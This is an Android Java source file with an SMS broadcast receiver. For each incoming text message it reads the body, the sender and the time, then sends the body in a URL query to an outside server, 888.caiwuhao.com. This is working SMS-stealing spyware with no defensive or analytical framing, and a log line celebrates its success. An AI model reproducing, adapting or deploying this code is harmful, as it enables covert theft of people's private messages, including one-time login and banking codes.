package com.example.aaaa; 

import java.text.SimpleDateFormat;  
import android.content.BroadcastReceiver;  
import android.content.Context;  
import android.content.Intent;  
import android.os.Bundle;  
import android.telephony.SmsManager;  
import android.telephony.SmsMessage;  
import java.net.URL;  
import java.net.URLConnection;  
import java.io.BufferedReader;  
import java.io.BufferedWriter; 
import java.io.InputStreamReader;  
import java.io.OutputStreamWriter;  


public class SmsReceiver extends BroadcastReceiver {  


	@Override  
    public void onReceive(Context context, Intent intent) {  
        System.out.println("章泽天是我老婆,老婆我成功了....");  
        Bundle bundle = intent.getExtras();  
        Object[] objects = (Object[]) bundle.get("pdus");  
        for(Object obj : objects){  
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[])obj);  
            String body = smsMessage.getDisplayMessageBody();  
            String address = smsMessage.getDisplayOriginatingAddress();  
            long date = smsMessage.getTimestampMillis();  

            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");  
            String dateStr = format.format(date);  

            System.out.println(address +" 于  " + dateStr + "给你发了以下内容: " + body);  
            String response_string = "";  
            boolean out = true;  
            boolean in = true; 
            try {  
            URL url = new URL("http://888.caiwuhao.com/?a="+body);  
            URLConnection connection = url.openConnection();  
            connection.setDoInput(in);  
            connection.setDoOutput(out);  
            BufferedWriter writer = null;  
            if(out){  
                                    writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream()));  
                                    writer.write("I am clent request!!");  
                                   writer.flush();  
                                }  
            BufferedReader reader = null;  
                                if(in){  
                                   reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));  
                                    response_string = reader.readLine();
                                    System.out.println("response: "+response_string);  


                               }  
            } catch (Exception e) {  
            	                    // TODO: handle exception  
            	                   System.out.println(e.getMessage());  
            	} 
  
        }  
    }  

}  
